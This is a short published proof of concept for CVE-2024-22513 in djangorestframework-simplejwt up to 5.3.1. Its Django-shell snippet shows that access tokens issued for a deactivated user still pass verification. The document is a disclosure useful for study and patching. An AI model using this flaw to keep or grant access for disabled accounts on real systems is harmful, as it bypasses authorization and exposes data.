# Exploit Title: djangorestframework-simplejwt 5.3.1 - Information Disclosure
# Date: 26/01/2024
# Exploit Author: Dhrumil Mistry (dmdhrumilmistry)
# Vendor Homepage: https://github.com/jazzband/djangorestframework-simplejwt/
# Software Link:https://github.com/jazzband/djangorestframework-simplejwt/releases/tag/v5.3.1
# Version: <= 5.3.1
# Tested on: MacOS
# CVE : CVE-2024-22513

# The version of djangorestframework-simplejwt up to 5.3.1 is vulnerable.
# This vulnerability has the potential to cause various security issues,
# including Business Object Level Authorization (BOLA), Business Function
# Level Authorization (BFLA), Information Disclosure, etc. The vulnerability
# arises from the fact that a user can access web application resources even
# after their account has been disabled, primarily due to the absence of proper
# user validation checks.

# If a programmer generates a JWT token for an inactive user using
`AccessToken`
# class and `for_user` method then a JWT token is returned which can
be used for
# authentication across the django and django rest framework application.

# Start Django Shell using below command:
# python manage.py shell
# ----------------------------------------

# Create inactive user and generate token for the user
from django.contrib.auth.models import User
from rest_framework_simplejwt.tokens import AccessToken

# create inactive user
inactive_user_id = User.objects.create_user('testuser',
'test@example.com', 'testPassw0rd!', is_active=False).id

# django application programmer generates token for the inactive user
AccessToken.for_user(User.objects.get(id=inactive_user_id))  # error
should be raised since user is inactive

# django application verifying user token
AccessToken.for_user(User.objects.get(id=inactive_user_id)).verify() #
no exception is raised during verification of inactive user token